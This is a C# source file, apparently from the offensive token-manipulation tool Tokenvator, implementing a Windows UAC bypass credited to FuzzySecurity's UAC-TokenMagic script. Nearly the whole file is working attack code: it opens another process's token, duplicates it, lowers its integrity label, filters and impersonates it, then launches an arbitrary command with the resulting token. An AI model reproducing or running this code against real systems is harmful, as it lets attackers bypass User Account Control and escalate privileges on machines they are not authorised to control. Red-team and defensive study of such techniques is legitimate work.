using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

namespace Tokenvator
{
    class RestrictedToken : Tokens
    {

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public void BypassUAC(Int32 processId, String command)
        {
            Console.WriteLine(" [+] Running as: " + WindowsIdentity.GetCurrent().Name);
            GetPrimaryToken((UInt32)processId);
            SetTokenInformation();
            ImpersonateUser();
            CreateProcess.CreateProcessWithLogonW(phNewToken, command, "");
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }
            Console.WriteLine("[+] Recieved Handle for: " + processId);
            Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());

            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
                Console.WriteLine(" [-] Unable to Open Process Token: " + hProcess.ToInt32());
                return;
            }
            Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
            kernel32.CloseHandle(hProcess);

            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
            }
            else
            {
                Console.WriteLine(" [+] Existing Token Handle: " + hExistingToken.ToInt32());
                Console.WriteLine(" [+] New Token Handle: " + phNewToken.ToInt32());
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void SetTokenInformation()
        {
            Structs.SidIdentifierAuthority pIdentifierAuthority = new Structs.SidIdentifierAuthority();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                Console.WriteLine(" [+] Initialized SID : " + pSID.ToInt32());
            }

            Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            Structs.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Structs.TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
            
            if (ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
            {
                Console.WriteLine(" [+] Set Token Information : " + phNewToken.ToInt32());
            }
            else
            {
                GetError("NtSetInformationToken: ");
            }

            IntPtr luaToken = new IntPtr();
            if (ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
            {
                Console.WriteLine(" [+] Set LUA Token Information : " + luaToken.ToInt32());
            }
            else
            {
                GetError("NtFilterToken: ");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser()
        {
            IntPtr luaToken = new IntPtr();
            UInt32 flags = 4;
            ntdll.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);

            if (!advapi32.DuplicateTokenEx(
                        phNewToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out luaToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }
    }
}
